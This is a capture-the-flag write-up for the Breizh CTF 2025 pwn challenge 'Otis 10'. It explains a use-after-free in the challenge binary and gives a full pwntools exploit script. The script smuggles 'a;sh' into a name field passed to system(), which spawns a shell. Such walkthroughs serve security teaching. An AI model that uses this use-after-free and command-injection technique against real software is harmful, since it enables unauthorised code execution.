# Otis 10 - Breizh CTF 2025

## Challenge Description

Otis 10 is a Pwn challenge from Breizh CTF 2025. The binary simulates a transformation system between a cow and other creatures, and contains a classic Use-After-Free (UAF) vulnerability.

## Binary Analysis

The binary provides a menu with the following options:
- `n`: Create a new creature (allocates a new structure)
- `v`: Transform back into a cow (frees the creature)
- `m`: Moo! (allocates a message buffer and lets you input data)
- `r`: Roaaar! (calls `system()` with a command based on the creature's name)
- `q`: Quit

The relevant structure is:

```c
typedef struct {
    char msg[32];
    char name[64];
} creature_t;
```

The vulnerability arises because after freeing the `creature` pointer, it is not set to NULL. This allows a classic UAF scenario if a new allocation reuses the freed memory.

## Vulnerability

The exploitation flow is as follows:
1. Create a new creature (`n`), which allocates a `creature_t` structure.
2. Free the creature (`v`), but the pointer is not set to NULL.
3. Use the `m` option, which allocates a 96-byte buffer (same size as `creature_t`) and lets you input data. This allocation can reuse the freed memory.
4. The `r` option calls `system()` with a command that includes the creature's name, which is now under your control.

## Exploitation

The following exploit script demonstrates the attack:

```python
#!/usr/bin/env python3
from pwn import *

exe = "./otis_10"
context.binary = exe
context.terminal = ["kitty", "-e"]

def start():
    if args.GDB:
        return gdb.debug(exe, gdbscript="b main\nc")
    else:
        return process(exe)


def exploit(p):
    p.sendlineafter(b">", b"n")

    p.sendlineafter(b">", b"v")

    
    p.sendlineafter(b">", b"m")
    p.recvuntil(b"Message :")

    msg = b"A" * 32
    name = b"a;sh\x00"  
    payload = msg + name
    payload = payload.ljust(96, b"A")  

    p.sendline(payload)

    
    p.sendlineafter(b">", b"r")

    
    p.interactive()


if __name__ == "__main__":
    p = start()
    exploit(p)
```

### Exploit Explanation

- The exploit abuses the UAF by freeing the creature and then reallocating the same memory with controlled data.
- The `name` field is set to `a;sh\x00`, so when `system()` is called, the command becomes `echo 'Roarrr !' | /usr/games/cowsay -f a;sh`, which executes `sh` after the cowsay command fails.
- This results in a shell, allowing you to read the flag.

## Flag

Once the shell is obtained, you can retrieve the flag with:

```
$ cat flag.txt
BZHCTF{I_dont_have_this_flag_anymore}
```
